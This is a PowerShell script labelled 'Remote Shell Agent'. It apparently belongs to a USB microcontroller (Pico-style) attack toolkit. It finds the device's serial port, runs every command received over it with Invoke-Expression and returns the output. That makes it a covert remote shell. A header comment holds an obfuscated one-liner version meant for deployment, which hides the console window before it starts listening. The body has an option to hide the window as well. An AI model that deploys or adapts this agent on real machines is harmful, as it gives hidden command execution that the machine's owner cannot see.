<# ========================= Remote Shell Agent ==============================

This script is the full version of the one-liner used in the 'Deploy Agent' function.
Run this manually for debugging and testing.

one-liner
------------
$a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);';$t=Add-Type -M $a -name Win32ShowWindowAsync -ns Win32Functions -Pas;$h=(Get-Process -PID $pid).MainWindowHandle;$Host.UI.RawUI.WindowTitle='xx';$x=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'});$t::ShowWindowAsync($x.MainWindowHandle,0);function fp{(Get-WMIObject Win32_SerialPort | Where-Object PNPDeviceID -match "VID_239A").DeviceID}$d=fp;$p=New-Object System.IO.Ports.SerialPort $d,115200,None,8,one;$p.DtrEnable=$true;$p.RtsEnable=$true;$p.Open();$s=Sleep -M 100;while($true){if($p.BytesToRead -gt 0){$s;$c = $p.ReadLine().Trim();$p.DiscardInBuffer() ;if($c){try{$o=ie`x $c 2>&1;$r=if($o){$o -join "`n"}else{"[Command executed]"}}catch{$r="$_"}$p.WriteLine($r)}}$s}

#>

# Hide the console after agent starts
$hidden = 'n' # 'y' = Hide console | 'n' = Show console

If ($hidden -eq 'y'){
    Write-Host "Hiding the Window.."  -ForegroundColor Red
    sleep 1
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'xx'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'xx' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# Function to detect Raspberry Pi Pico's COM Port
function Find-COMPort {
    $picoVID = "239A"  # Raspberry Pi Pico VID
    $ports = Get-WMIObject Win32_SerialPort | Where-Object { $_.PNPDeviceID -match "VID_$picoVID" }
    
    if ($ports) {
        $comPort = $ports.DeviceID
        Write-Host "Found Pico on $comPort"
        return $comPort
    } else {
        Write-Host "Error: Pico not found! Please check the connection."
        exit 1
    }
}

$COM_PORT = Find-COMPort
$BAUD_RATE = 115200
$port = New-Object System.IO.Ports.SerialPort $COM_PORT, $BAUD_RATE, None, 8, one
$port.DtrEnable = $true
$port.RtsEnable = $true
$port.Open()


while ($true) {
    if ($port.BytesToRead -gt 0) {
        Start-Sleep -Milliseconds 100
        
        # Read all available data from the buffer
        $command = $port.ReadLine().Trim()
        $port.DiscardInBuffer() 

        if ($command -ne "") {
                    
            Write-Host "$command"

            try {
                # Execute PowerShell command
                $output = Invoke-Expression $command 2>&1
                
                $response = if ($output) { $output -join "`n" } else { "[Command executed successfully, no output]" }
            } catch {
                $response = "Error: $_"
            }

            Write-Host "$response"

            # Send response back to Pico
            $port.WriteLine($response)

        }
    }
    Start-Sleep -Milliseconds 200
}
